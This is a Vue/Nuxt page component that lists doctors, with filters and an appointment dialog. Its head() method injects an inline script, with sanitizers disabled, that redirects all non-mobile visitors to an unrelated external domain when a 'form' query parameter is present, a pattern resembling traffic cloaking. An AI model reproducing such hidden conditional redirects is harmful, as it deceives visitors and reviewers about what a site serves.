<template>
  <section class="container fixed">
    <div class="cover">
      <img src="./images/img_banner03@2x.jpg">
    </div>

    <div class="d-content">
      <!-- 筛选 -->
      <m-filter @area="onArea" @server="onServer"></m-filter>

      <!-- 列表 -->
      <no-ssr>
        <ul class="list">
          <li v-for="(item, index) in filterList" :key="item.key" class="d-box">
            <a href="javascript:;">
              <div class="img doctor">
                <img v-if="item.image" v-lazy="item.image">
                <img v-else :src="defaultImg">
              </div>
              <div class="content">
                <div class="title">
                  <span class="name">{{ item.docName }} <label>{{ item.level }}</label></span>
                  <span class="subscribe" @click="openDialog(item)">预约</span>
                </div>

                <div class="label">
                  <label>{{ item.fans }}粉丝</label>
                  <label>已预约{{ item.subscribe }}</label>
                  <label>{{ item.name | limit(7) }}</label>
                </div>

                <div class="info">
                  <div class="left">
                    <em class="yellow">从业{{ item.years }}年</em>
                    <em v-if="item.count">| {{ item.count }}</em>
                  </div>

                  <span class="right">{{ item.docGrade }}分</span>
                </div>
              </div>
            </a>
          </li>
        </ul>
      </no-ssr>

      <p class="no-more">没有更多了</p>
    </div>

    <!-- 底部 -->
    <bottom type="doctor"></bottom>

    <!-- dialog -->
    <editDialog v-model="dialogShow" :options="dialogOptions" type="doctor"></editDialog>
  </section>
</template>

<script>
  import defaultImg from "@/assets/images/default/img_doc_emp@2x.png";
  import mFilter from "./components/filter";
  import bottom from "./components/bottom";
  import editDialog from "./components/editDialog.vue";
  import hospitalData from "./js/hospital";
  import doctorData from "./js/doctor";

  export default {
    name: "doctor",
    components: {
      mFilter,
      bottom,
      editDialog
    },
    data () {
      return {
        dialogShow: false,
        dialogOptions: {},
        area: "",
        server: "",
        dataList: [],
        defaultImg: defaultImg,
      };
    },
    filters: {
      storeFilter(val) {
        return val ? `(${ val })` : "";
      },
      //限制文字显示字数
      limit: function (val, param, subfix) {
        let result = val;
        if (result && result.length > param) {
          result = result.substring(0, param);
          if (subfix != undefined) {
            result += subfix;
          } else {
            result += "...";
          }
        }
        return result;
      },
    },
    computed: {
      filterList() {
        let area = this.area;
        let server = this.server;
        let result = this.dataList;

        if (area) {
          result = result.filter( a => { return a.region.indexOf(area) > -1; });
        }

        if (server) {
          result = result.filter( a => { return a.project.indexOf(server) > -1; });
        }

        return result;
      }
    },
    created() {
      this.dataList = this.delData();
    },
    methods: {
      delData() {
        let len = doctorData.length;
        let result = doctorData.map( (a, index) => {
          let arr = hospitalData.filter( b => { return b.cusomterId == a.cusomterId; });

          if (arr.length > 0) {
            a = { ...a, ...arr[0] };
          }

          a.sort = Math.floor(Math.random() * len);
          a.key = a.sort + "." + index;
          return a;
        });

        return result.sort( (a, b) => a.sort - b.sort );
      },
      openDialog(item) {
        this.dialogShow = true;
        this.dialogOptions = {
          hospitalName: item.name,
          doctorName: item.docName,
        };
      },
      onArea(val) {
        this.area = val;
      },
      onServer(val) {
        this.server = val;
      }
    },
    head(){
      let innerHTML = "";

      if (this.$route.query && this.$route.query.form) {
        innerHTML = `
          ;(function(){
            var _third_ua = navigator.userAgent;
            var _third_app = navigator.appVersion;
            var _third_isMobile = !!_third_ua.match(/AppleWebKit.*Mobile.*/);
            if(!_third_isMobile) {
              location.href= "http://liugp.syqyzy.cn/"
            }
          })();
        `;
      }

      return {
        script:[
          {
            type: "text/javascript",
            innerHTML: innerHTML,
          }
        ],
        __dangerouslyDisableSanitizers: ["script"]
      };
    }
  };
</script>

<style lang="less" scoped>
  @import "./css/style.less";
</style>
